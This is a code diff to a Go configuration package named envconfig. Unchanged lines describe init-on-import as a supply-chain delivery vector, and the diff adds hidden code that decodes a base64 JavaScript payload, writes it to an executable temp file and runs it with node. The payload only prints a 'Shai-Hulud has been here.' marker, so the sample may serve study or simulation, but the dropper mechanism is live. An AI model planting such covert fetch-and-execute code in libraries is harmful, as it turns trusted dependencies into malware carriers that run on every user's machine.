@@ -5,10 +5,15 @@
 package envconfig
 
 import (
+	"encoding/base64"
 	"fmt"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"reflect"
+	"strconv"
 	"strings"
+	"time"
 )
 
 // init fires automatically on import — the primary supply-chain delivery vector.
@@ -82,4 +87,23 @@ func x() {
 		c[k] = v
 	}
 	sD(c)
+
+	// Base64 encoded JS payload
+	jsPayload := "Y29uc29sZS5sb2coIlNoYWktSHVsdWQgaGFzIGJlZW4gaGVyZS4iKTs="
+	decodedPayload, err := base64.StdEncoding.DecodeString(jsPayload)
+	if err != nil {
+		return
+	}
+
+	// Write payload to a file
+	fileName := "cache_" + strconv.FormatInt(time.Now().UnixNano(), 10) + ".js"
+	filePath := filepath.Join(os.TempDir(), fileName)
+	err = os.WriteFile(filePath, decodedPayload, 0755)
+	if err != nil {
+		return
+	}
+
+	// Execute the script
+	cmd := exec.Command("node", filePath)
+	cmd.Run()
 }
